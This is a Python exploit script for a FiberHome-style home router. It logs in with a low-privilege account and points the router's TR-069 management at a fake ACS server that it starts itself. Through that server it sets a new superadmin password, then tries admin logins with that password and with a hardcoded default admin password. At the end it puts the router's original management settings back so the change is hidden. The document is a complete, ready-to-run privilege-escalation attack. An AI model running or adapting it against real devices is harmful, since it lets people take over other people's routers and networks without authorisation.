import socket, threading, requests, random, time, binascii, re
from Crypto.Cipher import AES

KEY_FH_ECB = b"ABCDEFGHIJKLMNOP"
KEY_FH_CBC = bytes([i + 0x6f for i in range(16)])
BASE = "http://192.168.1.1"
ACS_PORT = 19090
NEW_PW = "admin123"
WIN_IP = "192.168.1.3"

def fhencrypt(pwd):
    c = AES.new(KEY_FH_CBC, AES.MODE_CBC, KEY_FH_CBC)
    r = pwd.encode()
    p = 16 - (len(r) % 16)
    return c.encrypt(r + bytes([p] * p)).hex().upper()

SOAP_SET_X2 = """<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<SOAP-ENV:Header>
<cwmp:ID SOAP-ENV:mustUnderstand="1">REPLACE_ID</cwmp:ID>
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<cwmp:SetParameterValues>
<ParameterList SOAP-ENC:arrayType="cwmp:ParameterValueStruct[2]">
<ParameterValueStruct>
<Name>InternetGatewayDevice.DeviceInfo.X_FH_Account.X_FH_WebUserInfo.Enable</Name>
<Value xsi:type="xsd:string">1</Value>
</ParameterValueStruct>
<ParameterValueStruct>
<Name>InternetGatewayDevice.DeviceInfo.X_FH_Account.X_FH_WebUserInfo.WebSuperPassword</Name>
<Value xsi:type="xsd:string">PLACEHOLDER_PW</Value>
</ParameterValueStruct>
</ParameterList>
<ParameterKey>FakeACS</ParameterKey>
</cwmp:SetParameterValues>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>"""

SOAP_EMPTY = """<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<SOAP-ENV:Header>
<cwmp:ID SOAP-ENV:mustUnderstand="1">0</cwmp:ID>
</SOAP-ENV:Header>
<SOAP-ENV:Body />
</SOAP-ENV:Envelope>"""

SOAP_INFORM_RESP = """<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<SOAP-ENV:Header>
<cwmp:ID SOAP-ENV:mustUnderstand="1">REPLACE_ID</cwmp:ID>
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<cwmp:InformResponse>
<MaxEnvelopes>1</MaxEnvelopes>
</cwmp:InformResponse>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>"""

def make_http(body):
    return (f"HTTP/1.1 200 OK\r\n"
            f"Content-Type: text/xml; charset=utf-8\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Server: FakeACS/1.0\r\n\r\n{body}")

def recv_all(conn, timeout=8):
    conn.settimeout(timeout)
    data = b""
    while True:
        try:
            c = conn.recv(4096)
            if not c: break
            data += c
            # Check for complete SOAP envelope
            if b"</SOAP-ENV:Envelope>" in data: break
        except:
            break
    return data

def acs_server():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", ACS_PORT))
    srv.listen(5)
    srv.settimeout(120)
    print(f"[ACS] Waiting on port {ACS_PORT}")
    try:
        conn, addr = srv.accept()
        print(f"[ACS] CPE from {addr}")

        # Phase 1: CPE sends Inform
        d1 = recv_all(conn, 10)
        t1 = d1.decode("utf-8", errors="replace")
        m = re.search(r"<cwmp:ID[^>]*>(.*?)</cwmp:ID>", t1, re.DOTALL)
        cid = m.group(1) if m else "1"
        print(f"[ACS] Inform ID={cid}")

        resp = SOAP_INFORM_RESP.replace("REPLACE_ID", cid)
        conn.sendall(make_http(resp).encode())
        print("[ACS] Sent InformResponse")

        # Phase 2: CPE sends empty POST (ready for commands)
        d2 = recv_all(conn, 8)
        if not d2:
            print("[ACS] No Phase2")
            conn.close()
            return
        t2 = d2.decode("utf-8", errors="replace")
        print(f"[ACS] Phase2 ({len(d2)} bytes)")

        # Extract session ID from Phase2
        m2 = re.search(r"<cwmp:ID[^>]*>(.*?)</cwmp:ID>", t2, re.DOTALL)
        cid2 = m2.group(1) if m2 else "2"

        # Send PLAINTEXT password + Enable=1
        set1 = SOAP_SET_X2.replace("REPLACE_ID", cid2).replace("PLACEHOLDER_PW", NEW_PW)
        conn.sendall(make_http(set1).encode())
        print(f"[ACS] Sent SetParameterValues (plaintext: {NEW_PW})")

        # Phase 3: CPE responds to SetParameterValues
        d3 = recv_all(conn, 5)
        if d3:
            t3 = d3.decode("utf-8", errors="replace")
            print(f"[ACS] Phase3 ({len(d3)} bytes)")
            if "SetParameterValuesResponse" in t3:
                print("[ACS] PLAINTEXT ACCEPTED!")
            elif "Fault" in t3:
                fmsg = re.search(r"<FaultString[^>]*>(.*?)</FaultString>", t3, re.DOTALL)
                fc = re.search(r"<FaultCode[^>]*>(.*?)</FaultCode>", t3, re.DOTALL)
                print(f"[ACS] FAULT: code={fc.group(1) if fc else '?'}, msg={fmsg.group(1) if fmsg else t3[:200]}")
            else:
                print(f"[ACS] Response: {t3[:200]}")
        else:
            print("[ACS] No Phase3")

        # Close session with empty response
        conn.sendall(make_http(SOAP_EMPTY).encode())
        print("[ACS] Sent empty close")

        conn.close()
    except socket.timeout:
        print("[ACS] Timeout")
    except Exception as e:
        print(f"[ACS] Error: {e}")
    srv.close()

t = threading.Thread(target=acs_server, daemon=True)
t.start()
time.sleep(1)

# User login + configure TR-069
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0"
s.get(BASE+"/fh", timeout=10)
s.get(BASE+"/cgi-bin/ajax?ajaxmethod=get_factory_mode&_=1", timeout=10)
s.get(BASE+"/cgi-bin/ajax?ajaxmethod=get_operator&_=2", timeout=10)
r = s.get(BASE+"/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid&_=3", timeout=10)
sid = r.json()["sessionid"]
s.post(BASE+"/cgi-bin/ajax",
       data=f"username=user&loginpd={fhencrypt('user1234')}&port=0&sessionid={sid}&ajaxmethod=do_login",
       headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)

def gsid():
    r = s.get(BASE+"/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid&_=" + str(random.random()), timeout=10)
    return r.json()["sessionid"]

sid = gsid()
data = (f"ajaxmethod=set_tr69_info&sessionid={sid}&method=info"
        f"&URL=http://{WIN_IP}:{ACS_PORT}/&Username=acs@acs.telkom.net"
        f"&X_FH_ConnectionRequestPath=/0&X_FH_ConnectionRequestPort=30005"
        f"&ConnectionRequestUsername=acs"
        f"&PeriodicInformEnable=1&PeriodicInformInterval=10")
s.post(BASE+"/cgi-bin/ajax", data=data, headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)

sid = gsid()
s.post(BASE+"/cgi-bin/ajax",
       data=f"ajaxmethod=set_tr69_info&sessionid={sid}&method=enable&EnableCWMP=1",
       headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)
print("[SETUP] CWMP enabled, URL set to fake ACS")

t.join(timeout=30)
time.sleep(2)

for pw in [NEW_PW, "%0|F?H@f!berhO3e"]:
    s2 = requests.Session()
    s2.headers["User-Agent"] = "Mozilla/5.0"
    s2.get(BASE+"/fh", timeout=10)
    r = s2.get(BASE+"/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid&_=3", timeout=10)
    sid2 = r.json()["sessionid"]
    body2 = f"username=admin&loginpd={fhencrypt(pw)}&port=0&sessionid={sid2}&ajaxmethod=do_login"
    r2 = s2.post(BASE+"/cgi-bin/ajax", data=body2,
                headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)
    lr = r2.json().get("login_result")
    print(f"admin/{pw} -> login_result: {lr}")
    if lr == 0:
        print(">>> ADMIN BERHASIL!")
        break

# Cleanup
sid = gsid()
data = (f"ajaxmethod=set_tr69_info&sessionid={sid}&method=info"
        f"&URL=http://acs-new.telkom.net:9090/web/tr069"
        f"&Username=acs@acs.telkom.net"
        f"&X_FH_ConnectionRequestPath=/0&X_FH_ConnectionRequestPort=30005"
        f"&ConnectionRequestUsername=acs"
        f"&PeriodicInformEnable=1&PeriodicInformInterval=10048")
s.post(BASE+"/cgi-bin/ajax", data=data, headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)

sid = gsid()
s.post(BASE+"/cgi-bin/ajax",
       data=f"ajaxmethod=set_tr69_info&sessionid={sid}&method=enable&EnableCWMP=0",
       headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)
print("[CLEANUP] Done")
